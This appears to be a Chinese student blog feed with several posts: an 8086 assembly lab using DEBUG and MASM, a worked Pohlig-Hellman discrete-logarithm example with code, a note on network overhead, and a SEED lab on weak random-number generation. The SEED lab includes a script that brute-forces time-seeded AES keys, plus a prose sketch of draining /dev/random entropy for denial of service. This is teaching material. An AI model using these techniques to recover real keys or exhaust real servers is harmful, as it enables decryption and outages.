<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230108163006762.png" alt="image-20230108163006762"></p>
<p>可以看出这里出现了CY,NA标志，说明减法出现了进位，CF=1，并且出现了辅助进位标志，NG标志位出现，说明最高位为1</p>
<h5 id="（2）两个操作数相加运算，结果放在附加段的0020H号单元"><a href="#（2）两个操作数相加运算，结果放在附加段的0020H号单元" class="headerlink" title="（2）两个操作数相加运算，结果放在附加段的0020H号单元"></a>（2）两个操作数相加运算，结果放在附加段的0020H号单元</h5><ol>
<li>AX 的值为 <code>0034H</code>；</li>
<li>AX 和 65 相加，结果在 AX 中；</li>
<li>用寄存器间接寻址方式（段超越）保存运算结果。</li>
</ol>
<p>当BX,SI,DI作为间址寄存器时，默认段寄存器在DS中，BP作为间址寄存器，默认段寄存器为SS，当然也可以采用段超越的方式改变段地址</p>
<p>mov ax ,es:[2000] ；段超越</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230108220509645.png" alt="image-20230108220509645"></p>
<p>可以看到最终ES段0020H单元的值变为了99</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230108220655558.png" alt="image-20230108220655558"></p>
<h5 id="（3）将-AX-寄存器中的-1234H-写入数据段的-2-号单元，读出-3-号单元的-12H-传送给-BL-寄存器（寻址方式自定）"><a href="#（3）将-AX-寄存器中的-1234H-写入数据段的-2-号单元，读出-3-号单元的-12H-传送给-BL-寄存器（寻址方式自定）" class="headerlink" title="（3）将 AX 寄存器中的 1234H 写入数据段的 2 号单元，读出 3 号单元的 12H 传送给 BL 寄存器（寻址方式自定）"></a>（3）将 AX 寄存器中的 1234H 写入数据段的 2 号单元，读出 3 号单元的 12H 传送给 BL 寄存器（寻址方式自定）</h5><p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230108221106158.png" alt="image-20230108221106158"></p>
<p>这里我们要知道使用的是小端模式，也就是低位存储在低地址端</p>
<h3 id="5-汇编语言程序设计"><a href="#5-汇编语言程序设计" class="headerlink" title="5.汇编语言程序设计"></a>5.汇编语言程序设计</h3><h4 id="5-1-简单的例子"><a href="#5-1-简单的例子" class="headerlink" title="5.1 简单的例子"></a>5.1 简单的例子</h4><p>编写一个汇编语言程序，实现下列公式计算（假设 X = 4、Y = 5）。</p>
<p><img src="https://doc.shiyanlou.com/userid12501labid343time1420198764938" alt="img"></p>
<p>汇编指令如下：</p>
<p><img src="https://doc.shiyanlou.com/userid12501labid343time1420199160249" alt="img"></p>
<p>如果在 DEBUG 下用 A 命令输入这些指令，必须把 X、Y 换成具体的数值（假设 X = 4、Y = 5）；Z、Z1 是存储单元地址，最后两条指令可写为 <code>MOV [0],AL</code> 和 <code>MOV [1],AH</code>，这样才能用 T 命令执行。</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">D:\dos〉DEBUG</span><br><span class="line">-A</span><br><span class="line">MOV AL,4 ; X = 4</span><br><span class="line">ADD AL,5 ; Y = 5</span><br><span class="line">MOV BL,8</span><br><span class="line">IMUL BL</span><br><span class="line">MOV BL,4</span><br><span class="line">MOV B,0</span><br><span class="line">SUB AX,BX</span><br><span class="line">MOV BL,2</span><br><span class="line">IDIV  BL</span><br><span class="line">MOV [0],AL</span><br><span class="line">MOV [1],AH</span><br></pre></td></tr></table></figure>
<p>最后我们使用 T 命令执行。</p>
<p>采用 DEBUG 的 A 命令输入程序的做法明显不方便，一是无法给出变量名即符号地址，二是调试修改程序不便。因此，采用编写源程序的方式更有利于程序的调试和执行。</p>
<h4 id="5-2-编写汇编语言源程序"><a href="#5-2-编写汇编语言源程序" class="headerlink" title="5.2 编写汇编语言源程序"></a>5.2 编写汇编语言源程序</h4><p>​    一个完整的汇编语言源程序需要增加段定义伪指令和定义数据存储单元伪指令等必须有的伪指令。伪指令与 C 语言等高级语言中的说明性语句的含义类似，起到说明作用。有了伪指令，系统在汇编该程序时，就会正确的将源程序翻译、连接成可执行文件。</p>
<p>​    我们先给这个源程序起名为 ABC.ASM（汇编源程序的扩展名为.ASM）。在宿主机中用记事本 <code>gedit</code> 或者在 dos 子目录下用 edit 输入源程序。</p>
<p><img src="https://doc.shiyanlou.com/userid12501labid343time1421241825305" alt="img"></p>
<p>汇编语言程序建立及汇编过程如图所示。</p>
<p><img src="https://doc.shiyanlou.com/userid12501labid343time1420205904200" alt="img"></p>
<p>用户编写的源程序要经汇编程序 MASM 汇编（翻译）后生成二进制目标程序，文件名默认与源程序同名、扩展名为 .OBJ；再经过 LINK 连接生成可执行程序，文件名默认与源程序同名、扩展名为 .EXE。</p>
<p><strong><code>注意</code></strong>：源程序一定要和 MASM、LINK 文件放在同一个文件夹中</p>
<p>输入汇编命令 <code>masm abc.asm</code></p>
<p><img src="https://doc.shiyanlou.com/userid12501labid343time1421317253487" alt="img"></p>
<p><strong><code>注意</code></strong>：此处显示 0 个警告性错误，0 个严重性错误。如果有错误，必须对源程序进行修改。</p>
<p>2）输入连接命令 <code>link abc.obj</code></p>
<p><img src="https://doc.shiyanlou.com/userid12501labid343time1421317629049" alt="img"></p>
<p><strong><code>注意</code></strong>：此处有一个警告性错误：no stack segment 没有堆栈段。这个提示是由于我们的程序中没有定义堆栈段，此错误可以忽略，不影响生成 .exe 文件。如果出现严重性错误，必须再检查一下源程序有无错误。</p>
<p>（3）用 dir 查看一下</p>
<p><img src="https://doc.shiyanlou.com/userid12501labid343time1421326596534" alt="img"></p>
<p>已经生成了 abc.exe 可执行程序了。如果程序有错误，再回到记事本修改错误；之后需要重新汇编和连接。</p>
<p>（4）接着运行该程序 abc.exe（运行的方式是直接在 <code>dosemu</code> 中输入 <code>abc.exe</code>），可以看到没有显示任何结果就退回到 DOS 下了。</p>
<h4 id="5-3-在debug下执行程序"><a href="#5-3-在debug下执行程序" class="headerlink" title="5.3 在debug下执行程序"></a>5.3 在debug下执行程序</h4><p>如果源程序无错误，就能汇编、连接成为可执行程序 abc.exe。</p>
<p>由于该程序没有写显示结果的指令语句，要想观察结果必须用 DEBUG 调试工具。</p>
<p>（1）输入 <code>DEBUG abc.exe</code></p>
<p><img src="https://doc.shiyanlou.com/userid12501labid343time1421324885037" alt="img"></p>
<p>（2）输入两次 U 命令后可以看到结束程序语句 <code>MOV AH,4C</code> 指令对应的偏移地址是 0023，这就是断点（所谓断点，就是程序执行到该处停下来不再继续）。用 <code>G 0023</code>（G 断点）执行程序。此时得到 AX=0022，再执行 <code>D DS:0</code> 查看存储单元，第 0 号单元是 04，即 X 单元，05 是 Y 的值，22 就是计算结果 Z 的十六进制数。</p>
<p><img src="https://doc.shiyanlou.com/userid12501labid343time1421325477660" alt="img"></p>
<p>（3）按 Q 退出 DEBUG</p>
<h4 id="5-4-屏幕显示和键盘输入"><a href="#5-4-屏幕显示和键盘输入" class="headerlink" title="5.4 屏幕显示和键盘输入"></a>5.4 屏幕显示和键盘输入</h4><p>在汇编语言中，凡是涉及到键盘输入、屏幕显示等输入输出操作，都可以用软件中断指令 <code>INT n</code> 的功能调用来实现。所谓功能调用是计算机系统设计的简单 I / O 子程序，能方便地访问系统的硬件资源。</p>
<p>在微机系统中，功能调用分两个层次，最底层的是 BIOS 功能调用，其次是 DOS 功能调用，它们都是通过软件中断指令 <code>INT n</code> 来进行调用的。除了用 INT 指令实现输入和显示之外，还可以通过直接写显示缓冲区的方式显示字符。</p>
<h4 id="（1）DOS-功能调用"><a href="#（1）DOS-功能调用" class="headerlink" title="（1）DOS 功能调用"></a>（1）DOS 功能调用</h4><p>DOS 的功能调用采用 <code>INT 21H</code> 指令，调用时要求在 AH 中提供功能号，在指定的寄存器和存储单元中提供调用必需的参数和缓冲区地址，执行后系统在 AL 中放入返回参数。</p>
<p>常用的 DOS 功能调用有 5 个：</p>
<ul>
<li>1 号 DOS 功能调用：键盘输入 1 个字符</li>
<li>2 号 DOS 功能调用：显示器输出 1 个字符</li>
<li>9 号 DOS 功能调用：显示字符串</li>
<li>10 号 DOS 功能调用：键盘输入缓冲区</li>
<li>4CH 号 DOS 功能调用：返回 DOS 控制</li>
</ul>
<p><strong><code>注意</code></strong>：I/O 处理操作的都是 ASCⅡ 码，对于键盘输入的数字，做计算时需将 ASCⅡ 码转变为二进制数，输出显示数据时需将二进制数转为 ASCⅡ 码。数字 0～9 的 ASCII 码为 30H～39H，可以看出两者之间相差 30H。</p>
<h4 id="（2）DOS-功能调用例子"><a href="#（2）DOS-功能调用例子" class="headerlink" title="（2）DOS 功能调用例子"></a>（2）DOS 功能调用例子</h4><p>例子：显示两行字符串（回车换行功能）。第 1 行为“Input x:”，第 2 行为“Output y=x+1:”。从键盘输入 x，输出 y = x + 1 的值。</p>
<p>创建.asm文件，内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">data segment  </span><br><span class="line">    mess1 db &#x27;Input x:&#x27;,&#x27;$&#x27;</span><br><span class="line">    mess2 db 0ah,0dh, &#x27;Output y:$&#x27;   ;0ah和0dh是换行和回车 </span><br><span class="line">    y db ?</span><br><span class="line">data ends</span><br><span class="line">code segment</span><br><span class="line">assume cs:code,ds:data</span><br><span class="line">start: mov ax, data</span><br><span class="line">mov ds,ax        ;数据段的段地址→ds</span><br><span class="line">mov dx,offset mess1</span><br><span class="line">mov ah,9           ;显示提示信息“Input x:”</span><br><span class="line">int 21h</span><br><span class="line">mov ah,1    ;1号功能，键盘输入，键入的值在al</span><br><span class="line">int 21h</span><br><span class="line">add al,1        ;al+1→al </span><br><span class="line">mov y,al        ;保存到y单元 </span><br><span class="line">mov dx,offset mess2        </span><br><span class="line">mov ah,9    ;在下一行显示提示信息“Output y:”        </span><br><span class="line">int 21h</span><br><span class="line">mov ah,2    ;2号功能，显示一个字符</span><br><span class="line">mov dl,y     ;显示的字符要放入dl,显示x+1的值</span><br><span class="line">int 21h</span><br><span class="line">mov ah,4ch</span><br><span class="line">int 21h</span><br><span class="line">code ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20230109095306802.png" alt="image-20230109095306802"></p>
<h4 id="实验示例1"><a href="#实验示例1" class="headerlink" title="实验示例1"></a>实验示例1</h4><p><strong><code>关注点</code></strong>：键盘输入，彩色字显示</p>
<p>例子：用简化的程序格式从键盘输入两个一位的十进制数，做加法运算。相加后以蓝底黄字显示在屏幕上。</p>
<p>（1）键盘输入用 DOS 中断调用 1 号功能；显示采用写显存方法；</p>
<p>（2）经非压缩 BCD 码加法调整指令 AAA 调整后会将 AL 的高 4 位清零，因此键盘输入的数字不必去掉 30H，可直接运算；</p>
<p>（3）用 BIOS 中断调用 INT 10H 的 3 号功能获得光标的位置，让结果显示在光标处；</p>
<p>（4）由于计算结果不会超过两位十进制数，可用 SI 寄存器保存十进制数的 ASCII 码。</p>
<p><img src="https://doc.shiyanlou.com/dosemu4-1.jpg" alt="Alt text"></p>
<p>​    在用AAA指令调整以前，先用指令ADD（多字节加法时用ADC）进行8位数的加法运算，相加结果放在AL中，用AAA指令调整后，非压缩型BCD码结果的低位在AL寄存器，高位在AH寄存器。例如，要求计算两个十进制数之和，7+8=?。可以先将被加数7、加数8以非压缩型BCD码的形式分别存放在寄存器AL和BL中，且令AH=0，然后进行加法，再用AAA指令调整。可用以下指令实现：</p>
<blockquote>
<p>​    MOV AX，0007H  ;(AL)=07H，(AH)=00H</p>
<p>​    MOV BL，08H   ;(BL)=08H</p>
<p>​    ADD AL，BL    ;(AL)=0FH</p>
<p>​    AAA       ;(AL)=05H，(AH)=01H，(CF)=(AF)=1</p>
</blockquote>
<p>例子：从键盘输入两个一位的十进制数，做乘法运算。相乘的结果保存在存储单元 X 中，算式显示在屏幕上。用简化的程序格式。</p>
<h4 id="实验示例2"><a href="#实验示例2" class="headerlink" title="实验示例2"></a>实验示例2</h4><p>设计思路</p>
<p>（1）用 DOS 中断调用的 1 号功能输入数据，用 2 号功能显示结果，9 号功能显示提示信息；</p>
<p>（2）做乘法时必须将输入数字的 ASCII 码去掉，转换成数值；</p>
<p>（3）乘法之后用十进制调整指令 AAM；</p>
<p>（4）将要显示的数值变为 ASCII 码。</p>
<p>实验步骤</p>
<p><img src="https://doc.shiyanlou.com/dosemu4-3.jpg" alt="Alt text"></p>
]]></content>
      <categories>
        <category>汇编语言</category>
      </categories>
      <tags>
        <tag>汇编</tag>
      </tags>
  </entry>
  <entry>
    <title>离散对数计算</title>
    <url>/2022/12/08/%E7%A6%BB%E6%95%A3%E5%AF%B9%E6%95%B0%E9%97%AE%E9%A2%98%E7%9A%84%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<h3 id="离散对数问题的计算"><a href="#离散对数问题的计算" class="headerlink" title="离散对数问题的计算"></a><center>离散对数问题的计算</center></h3><h5 id="1-p-41-alpha-6-beta-29"><a href="#1-p-41-alpha-6-beta-29" class="headerlink" title="1.p = 41,$\alpha$ = 6,$\beta$ = 29"></a>1.p = 41,$\alpha$ = 6,$\beta$ = 29</h5><script type="math/tex; mode=display">
n = p-1 =40=2^3\times5\\
计算a = lb29,首先计算a\ mod \ 8然后计算a \ mod\ 5\\
取q=2,c=3\\
n\equiv0\pmod {2^3}\\
n \not\equiv 0\pmod {2^4}\\
\beta_{0} = 29,\beta_{0}^{n/q} = -1\pmod {41}\\
\alpha^{a_{0}n/q} \equiv -1\pmod {41}\\
a_{0}=1\\
\beta_{1} = \beta_{0}\alpha^{-a_{0}q^0}\equiv-1\pmod {41}\\
\alpha^{a_{1}n/q} \equiv -1\pmod {41}\\
a_{1}=1\\
\beta_{2} = \beta_{1}\alpha^{-a_{1}q^1}\equiv-1\pmod {41}\\
\alpha^{a_{2}n/q} \equiv -1\pmod {41}\\
a_{2}=1\\
a \equiv 2^0+2^1+2^2=7\pmod8\\
再取q= 5，c=1同理可得
a \equiv 2\times5^0=2\pmod 5\\
\left\{\begin{matrix} 
  a \equiv 7\pmod8 \\  
  a \equiv 2\pmod 5 
\end{matrix}\right. \\
由中国剩余定理可得
a \equiv 7 \pmod {40}</script><p>经验证$5^7\equiv29\pmod{41}$</p>
<h5 id="2"><a href="#2" class="headerlink" title="2."></a>2.</h5><script type="math/tex; mode=display">
n = p-1 =36=2^2\times3^2\\
计算a = lb29,首先计算a\ mod \ 4然后计算a \ mod\ 9\\
取q=2,c=2\\
n\equiv0\pmod {2^2}\\
n \not\equiv 0\pmod {2^3}\\
\beta_{0} = 29,\beta_{0}^{n/q} = -1\pmod {37}\\
\alpha^{a_{0}n/q} \equiv -1\pmod {37}\\
a_{0}=1\\
\beta_{1} = \beta_{0}\alpha^{-a_{0}q^0}\equiv1\pmod {37}\\
\alpha^{a_{1}n/q} \equiv 1\pmod {37}\\
a_{1}=2\\
a \equiv 2^0+2\times2^1=1\pmod{4}\\
再取q= 3，c=2同理可得
a \equiv 3\times3^0+3\times3^1\equiv3\pmod 9\\
\left\{\begin{matrix} 
  a \equiv 1\pmod4 \\  
  a \equiv 3\pmod 9 
\end{matrix}\right. \\
由中国剩余定理可得
a \equiv 21 \pmod {36}</script><p>经验证$2^{21}\equiv29 \pmod {37}$</p>
<p>我们根据上述利用Pohlig-Hellman解离散对数问题的原理，也可以编程进行求解。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">Pohlig_Hellman</span>(<span class="params">p,n,a,b,q,c</span>):</span><br><span class="line">    ai = <span class="number">0</span></span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    bj = b</span><br><span class="line">    <span class="keyword">while</span> j&lt;=c-<span class="number">1</span>:</span><br><span class="line">        t = power_mod(bj,<span class="built_in">int</span>(n/<span class="built_in">pow</span>(q,j+<span class="number">1</span>)),p)</span><br><span class="line">        k = power_mod(a,<span class="built_in">int</span>(n/q),p)</span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        w = k</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">if</span> w == t:</span><br><span class="line">                ai+=i*<span class="built_in">pow</span>(q,j)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                w = w*k%p</span><br><span class="line">                i+=<span class="number">1</span></span><br><span class="line">        bj = bj*power_mod(a,-i*<span class="built_in">pow</span>(q,j),p)</span><br><span class="line">        j+=<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ai%<span class="built_in">pow</span>(q,c)</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">attack</span>(<span class="params">a,b,p</span>):</span><br><span class="line">    n = p-<span class="number">1</span></span><br><span class="line">    ai = []</span><br><span class="line">    m =[]</span><br><span class="line">    result = factor(n)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> result:</span><br><span class="line">        q = i[<span class="number">0</span>]</span><br><span class="line">        c = i[<span class="number">1</span>]</span><br><span class="line">        ai.append(Pohlig_Hellman(p,n,a,b,q,c))</span><br><span class="line">        m.append(<span class="built_in">pow</span>(q,c)) </span><br><span class="line">    <span class="built_in">print</span>(crt(ai,m))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Cryptography</category>
      </categories>
      <tags>
        <tag>公钥密码</tag>
      </tags>
  </entry>
  <entry>
    <title>网络杂谈1</title>
    <url>/2022/12/14/%E7%BD%91%E7%BB%9C%E6%9D%82%E8%B0%881/</url>
    <content><![CDATA[<p>​    家里网络并不是很好，总想应用网络知识来解决一下，理论和实践相结合嘛。</p>
<h3 id="1-传输损耗"><a href="#1-传输损耗" class="headerlink" title="1.传输损耗"></a>1.传输损耗</h3><p>​    首先看一个互联网中传输的数据分组的结构，在互联网中数据通过帧来进行传播，在帧的封装中，会加入一些冗余信息来标记协议和数据内容，因此实际传输的数据和最大传输数据之间是有差异的。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221214203518476.png" alt="image-20221214203518476"></p>
<p>​    </p>
<p>​    而1492字节的MTU里面又有20字节的IP头部，20字节的TCP头部，因此MSS最大报文长度为1452字节，由此我们1452/1538大概就是94%的水平。</p>
<h4 id="2-网络结构"><a href="#2-网络结构" class="headerlink" title="2.网络结构"></a>2.网络结构</h4><p>​    在研究家庭网络</p>
]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
      <tags>
        <tag>network</tag>
      </tags>
  </entry>
  <entry>
    <title>seedlab(五)</title>
    <url>/2023/01/05/%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
    <content><![CDATA[<h1 id="random-number"><a href="#random-number" class="headerlink" title="random number"></a><center>random number</center></h1><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><p>​    生成随机数是安全软件中非常常见的任务。再许多情况下，加密密钥不是由用户提供的，而是在软件内部生成的。它们的随机性非常重要，否则，攻击者可以预测加密密钥来达到破坏加密的目的，许多开发人员从其先前的经验中知道如何生成随机数（例如用于蒙特卡洛模拟)，因此他们使用类似的方法生成用于安全目的的随机数。不幸的是，随机数序列对于蒙特卡洛模拟可能是好的，但对于加密密钥则可能是不好的。开发人员需要知道如何生成安全的随机数，否则就会犯错。在一些著名的产品(包括Netscape和Kerberos )中也犯过类似的错误。</p>
<p>​    在本实验中，将学习为什么典型的随机数生成方法不适用于生成秘密（例如加密密钥)。进一步学习生成用于安全目的的伪随机数的标准方法。本实验涵盖以下主题:</p>
<p>1.伪随机数生成</p>
<p>2.随机数生成中的错误</p>
<p>3.加密密钥生成</p>
<p>4.设备文件/dev/random和/dev/urandom</p>
<h2 id="二、实验步骤和实验结果"><a href="#二、实验步骤和实验结果" class="headerlink" title="二、实验步骤和实验结果"></a>二、实验步骤和实验结果</h2><h4 id="2-1-Task-1：用错误的方式生成加密密钥"><a href="#2-1-Task-1：用错误的方式生成加密密钥" class="headerlink" title="2.1 Task 1：用错误的方式生成加密密钥"></a>2.1 Task 1：用错误的方式生成加密密钥</h4><p>​    编写下面的伪随机数生成程序来生成伪随机数，其中time()函数以秒数的形式返回当前时间。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221209204957351.png" alt="image-20221209204957351"></p>
<p>​    编译运行程序，可以看到结果如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221209205514095.png" alt="image-20221209205514095"></p>
<p>​    下面我们将srand(time(NULL))进行注释，重新编译运行程序</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221209205434739.png" alt="image-20221209205434739"></p>
<p>​    通过对比我们可以发现，在使用了srand(time(NULL))语句后，每次得到的密钥都是不同的，而注释掉后，虽然time也是不断增长的，但是每次得到的密钥key都是相同的。</p>
<p>​    <strong>原因</strong>：srand函数是初始化随机种子，这个种子会对应一个随机数，如果提供的种子相同，那么rand()函数产生的随机值也相同。在这里如果我们注释掉srand函数，每次随机数生成就会使用相同的默认种子，导致生成的随机数一样。使用srand(time(NULL))每次都会用time函数的返回值初始化种子，由于time函数返回值为00:00:00 GMT, January 1, 1970 到现在所持续的秒数，因此会产生不同的随机密钥。</p>
<h4 id="2-2-Task-2：猜测密钥"><a href="#2-2-Task-2：猜测密钥" class="headerlink" title="2.2 Task 2：猜测密钥"></a>2.2 Task 2：猜测密钥</h4><p>​    这里Bob需要找出Alice的加密密钥，这里Bob已知明文、密文和初始向量IV，因此Bob只需要猜测密钥即可，由于密钥生成使用的是文件创建之前2小时内的时间种子，因此可以对种子进行遍历来猜测密钥。如果加密正确，那么就可以由种子推出加密密钥的值。</p>
<p>​    首先我们先要确定这两个小时的种子范围，下面是种子的范围</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221209211111572.png" alt="image-20221209211111572"></p>
<p>​    由于这里我们随机数生成使用的C语言程序，我们期望使用python去进行aes-128-cbc的加密，因此我们可以先将c语言生成的密钥保存在文件中。编写下面的程序，遍历所有的随机数种子，然后将生成密钥输出到文件。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221209212230944.png" alt="image-20221209212230944"></p>
<p>​    编译执行上面的程序，使用cat命令查看文件，可以发现密钥已经成功输出到文件中。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221209212135534.png" alt="image-20221209212135534"></p>
<p>​    下面我们对密钥进行遍历，使用密钥对明文进行加密，由于这里明文是16个字节也就是一个明文分组的长度，因此我们这里不用进行填充操作。下面定义aes-128-cbc加密函数，这里我们使用python中的Crypto.Cipher模块，由于AES加密模块需要bytes类型的输入，而从文件中读取的是hexstr，所以我们要使用bytes.fromhex来将hexstr类型转换为bytes，最后输出时再使用hex转为hexstr。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AES_En</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self,key,pt,ct,iv</span>):</span><br><span class="line">        self.key = key</span><br><span class="line">        self.pt = pt</span><br><span class="line">        self.iv = iv</span><br><span class="line">        self.ct = ct</span><br><span class="line">    <span class="comment">#encryption</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        cryptor = AES.new(self.key,AES.MODE_CBC,self.iv)</span><br><span class="line">        cipher_encode = cryptor.encrypt(self.pt)</span><br><span class="line">        <span class="keyword">if</span> cipher_encode == self.ct:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Key is:&quot;</span>,self.key.<span class="built_in">hex</span>())</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pt = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;255044462d312e350a25d0d4c5d80a34&quot;</span>)</span><br><span class="line">    ct = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;d06bf9d0dab8e8ef880660d2af65aa82&quot;</span>)</span><br><span class="line">    iv = <span class="built_in">bytes</span>.fromhex(<span class="string">&quot;09080706050403020100A2B2C2D2E2F2&quot;</span>)</span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&quot;key.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">    flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> flag==<span class="number">0</span>:</span><br><span class="line">        key = <span class="built_in">bytes</span>.fromhex(f.readline())</span><br><span class="line">        <span class="comment">#read a line </span></span><br><span class="line">        aes = AES_En(key,pt,ct,iv)</span><br><span class="line">        flag = aes.encrypt()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>​    执行上述python程序，找到的密钥如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221209215206610.png" alt="image-20221209215206610"></p>
<h4 id="3-3-Task-3-测量内核的熵"><a href="#3-3-Task-3-测量内核的熵" class="headerlink" title="3.3 Task 3:测量内核的熵"></a>3.3 Task 3:测量内核的熵</h4><p>​    在虚拟世界中，创建随机性是困难的，只靠软件是很难生成随机数的。许多系统从物理世界中获得随 机性。Linux 从下面的物理资源中获取随机性：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="type">void</span> <span class="title function_">add_keyboard_randomness</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> scancode)</span>;</span><br><span class="line"><span class="number">2</span> <span class="type">void</span> <span class="title function_">add_mouse_randomness</span><span class="params">(__u32 mouse_data)</span>;</span><br><span class="line"><span class="number">3</span> <span class="type">void</span> <span class="title function_">add_interrupt_randomness</span><span class="params">(<span class="type">int</span> irq)</span>;</span><br><span class="line"><span class="number">4</span> <span class="type">void</span> <span class="title function_">add_blkdev_randomness</span><span class="params">(<span class="type">int</span> major)</span>;</span><br></pre></td></tr></table></figure>
<p>​    第一个使用按键之间的时间间隔；第二个使用鼠标移动和中断时间；第三个使用 中断（interrupt）时间来获取随机数。当然，并非所有中断都是随机性的良好来源。例如，定时器中断便 不是一个很好的选择，因为它是可预测的。而磁盘中断是更好的措施。最后一个函数使用的是块设备请求 的完成时间。</p>
<p>​    使用下面的命令我们可以找出当前时刻在内核中的熵时多少</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221210162036111.png" alt="image-20221210162036111"></p>
<p>​    watch 可以周期性地执行一个程序。我们使用 watch 运行上面的命令来监控熵的变化。下面的命令每 0.1 秒就执行一次 cat 程序。</p>
<p>​    </p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">watch -n .1 cat /proc/sys/kernel/random/entropy_avail</span><br></pre></td></tr></table></figure>
<p>​    执行命令我们发现，当移动鼠标和点击鼠标时，其显示的数值也在不断增加，且移动和点击鼠标的频率越高，数值增加的越快。当我们点击键盘按键进行输入时，数值也会不断的增加。当我们对文件进行访存操作时，熵的数值也会不断的增加。另外，对网页的操作也会使熵值增加，但是不如前面的操作明显，而且有时也会产生波动，估计是在访问网页的过程中可能会用到内核熵池。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221210164605431.png" alt="image-20221210164605431"></p>
<h4 id="3-4-任务4：从-dev-random中获取随机数"><a href="#3-4-任务4：从-dev-random中获取随机数" class="headerlink" title="3.4 任务4：从/dev/random中获取随机数"></a>3.4 任务4：从/dev/random中获取随机数</h4><p>​    Linux 将从物理资源收集的随机数据存储到一个随机池中，然后使用两个设备将随机源转换为伪随机 数。这两个设备是 /dev/random 和 /dev/urandom 。它们有不同的行为。/dev/random 设备是阻塞设备。 即，每当该设备给出随机数时，随机池的熵将减小。当熵达到零时，/dev/random 将阻塞，直到获得足够 的随机性为止。</p>
<p>​    使用 cat 命令持续从 /dev/random 中 读取伪随机数。我们将输出通过管道传递到 hexdump 以便获得良好的输出。我们执行命令的同时，在另一个窗口观察熵值的变化。</p>
<p><img src="https://cdn.jsdelivr.net/gh/sdu-lzq/image_box@main/image_blog/image-20221210165119511.png" alt="image-20221210165119511"></p>
<p>​    可以看到，当我们从/dev/random获取随机数时，内核熵值将减少，当减少到一定数值时/dev/random将被阻塞，这时我们移动鼠标，内核熵值将会增大，增大到一定程度后熵值又会变小，同时/dev/random生成新的随机数序列。</p>
<p><strong>问题：</strong>  假设一个服务器使用 /dev/random 与客户端生成随机会话密钥。请描述你将如何对这样的一个服务器发起拒绝服务（DoS）攻击。</p>
<p>拒绝服务攻击就是耗尽服务器资源，从而让服务器崩溃或者无法响应其他客户端的请求。在这里服务器使用/dev/random来生成随机会话密钥，根据上面的实验我们发现服务器生成随机值依赖于内核熵池，因此，我们可以伪装成客户端向服务器发送大量请求，从而使服务器生成大量会话密钥，这样就可以耗尽熵池内的熵，从而使熵池内的熵的增加不足以生成新的会话密钥，就可以达到拒绝服务攻击的目的。</p>
<h4 id="3-5-任务-5：从-dev-urandom获取随机数"><a href="#3-5-任务-5：从-dev-urandom获取随机数" class="headerlink" title="3.5 任务 5：从/dev/urandom获取随机数"></a>3.5 任务 5：从/dev/urandom获取随机数</h4><p>​    </p>
